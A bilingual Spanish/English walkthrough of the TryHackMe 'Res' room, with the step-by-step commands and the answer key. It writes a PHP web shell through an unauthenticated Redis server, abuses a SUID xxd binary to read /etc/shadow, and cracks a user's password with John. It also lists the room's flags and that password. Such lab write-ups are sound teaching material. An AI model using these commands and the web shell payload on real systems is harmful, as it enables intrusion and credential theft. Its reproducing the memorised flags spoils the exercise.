# Res [EASY]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** EASY
* **Tipo / Type:** Walkthrough
* **Slug:** `res`
* **Link:** https://tryhackme.com/room/res
* **Sección / Section:** 01 Level Easy
* **Fuente / Source:** Writeups públicos de thmrevenant, 2br007, jc01.ninja, Harellevy (Medium), noobsixt9 (Medium) y rarpunzel (Medium).

## Solucionario de Tareas / Task Solutions

> **ES:** Res es una máquina Linux que explota un servidor Redis 6.0.7 expuesto sin autenticación en el puerto 6379. Mediante `redis-cli` se escribe una webshell PHP en el document root de Apache, logrando RCE como `www-data`. La escalada de privilegios aprovecha el binario SUID `xxd` para leer `/etc/shadow`, cuyo hash de la usuaria `vianka` se crackea con John The Ripper (contraseña `beautiful1`); `vianka` tiene permisos sudo totales y `sudo su` concede root.
> **EN:** Res is a Linux machine that exploits a Redis 6.0.7 instance exposed without authentication on port 6379. Using `redis-cli`, a PHP web shell is written into the Apache document root, achieving RCE as `www-data`. Privilege escalation abuses the SUID binary `xxd` to read `/etc/shadow`; the hash of user `vianka` is cracked with John The Ripper (password `beautiful1`); `vianka` has full sudo rights so `sudo su` grants root.

### Task 1 - Redis sin credenciales y escalada con xxd / Unauthenticated Redis and xxd Privilege Escalation

> **ES:** El escaneo inicial revela únicamente dos puertos abiertos: 80 (Apache) y 6379 (Redis 6.0.7). Redis no exige autenticación, por lo que con `redis-cli` se puede cambiar la configuración en caliente (`CONFIG SET dir/dbfilename`) y entregar el payload con `SET` + `SAVE`, materializando una webshell PHP en `/var/www/html/shell.php`. Tras obtener el foothold, `find / -perm -4000` muestra `/usr/bin/xxd` con el bit SUID: `xxd "$LFILE" | xxd -r` permite leer cualquier archivo como root, incluido `/etc/shadow`. El hash de `vianka` se rompe con John (wordlist rockyou) y su contraseña es `beautiful1`; con `su vianka` y su sudo total se alcanza una shell de root.
> **EN:** The initial scan reveals only two open ports: 80 (Apache) and 6379 (Redis 6.0.7). Redis requires no authentication, so with `redis-cli` the configuration can be changed on the fly (`CONFIG SET dir/dbfilename`) and the payload delivered via `SET` + `SAVE`, materializing a PHP web shell at `/var/www/html/shell.php`. After the foothold, `find / -perm -4000` shows `/usr/bin/xxd` with the SUID bit set: `xxd "$LFILE" | xxd -r` reads any file as root, including `/etc/shadow`. The hash of `vianka` is cracked with John (rockyou wordlist) and her password is `beautiful1`; with `su vianka` and her full sudo rights a root shell is reached.

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| Scan the machine, how many ports are open? | `2` |
| What's is the database management system installed on the server? | `redis` |
| What port is the database management system running on? | `6379` |
| What's is the version of management system installed on the server? | `6.0.7` |
| Compromise the machine and locate user.txt | `thm{red1s_rce_w1thout_credent1als}` |
| What is the local user account password? | `beautiful1` |
| Escalate privileges and obtain root.txt | `thm{xxd_pr1v_escalat1on}` |

## Metodología / Methodology

1. **Paso / Step - Reconocimiento:** `nmap -sC -sV -p-` contra la máquina revela solo dos puertos: 80 (Apache 2.4.18) y 6379 (Redis key-value store 6.0.7).
2. **Paso / Step - Conexión a Redis:** `redis-cli -h <IP>` permite conectarse sin credenciales; el comando `INFO` confirma la versión y revela nombres de usuario potenciales como `vianka`.
3. **Paso / Step - RCE vía Redis:** se configura el directorio del servidor web con `CONFIG SET dir /var/www/html`, `CONFIG SET dbfilename shell.php`, se almacena el payload PHP con `SET x "<?php system($_GET['cmd']); ?>"` y se persiste con `SAVE`.
4. **Paso / Step - Webshell y reverse shell:** se accede a `http://<IP>/shell.php?cmd=...` para ejecutar comandos; una reverse shell vía `nc` o `python3 -c` da una sesión como `www-data`.
5. **Paso / Step - Enumeración de privilegios:** `find / -type f -perm -4000 2>/dev/null` encuentra `/usr/bin/xxd` con SUID; en GTFOBins se confirma lectura/escritura arbitraria de archivos.
6. **Paso / Step - Lectura de /etc/shadow y crackeo:** `LFILE=/etc/shadow; xxd "$LFILE" | xxd -r` vuelca el shadow; el hash de `vianka` se crackea con `john --wordlist=/usr/share/wordlists/rockyou.txt` dando `beautiful1`.
7. **Paso / Step - Root:** `su vianka` (password `beautiful1`), `sudo -l` muestra permisos `(ALL : ALL) ALL`, y `sudo su` entrega una shell de root y la flag `root.txt`.

### Cadena de ataque / Attack Chain

```
nmap -> 80 (Apache) + 6379 (Redis 6.0.7)
              |
        redis-cli (sin credenciales)
              |
  CONFIG SET dir /var/www/html
  CONFIG SET dbfilename shell.php
  SET x "<?php system($_GET['cmd']); ?>" + SAVE
              |
        webshell.php -> RCE (www-data)
              |
    SUID /usr/bin/xxd -> leer /etc/shadow
              |
    john -> beautiful1 (vianka) -> su vianka
              |
   sudo su -> root -> root.txt
```

**Lección:** Un servicio expuesto y mal configurado (Redis sin autenticación) puede convertirse directamente en RCE, y un único binario SUID mal habitual (`xxd`) permite leer los ficheros más sensibles del sistema. Siempre endurecer los servicios internos y auditar los binaries con SUID/capabilities.

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.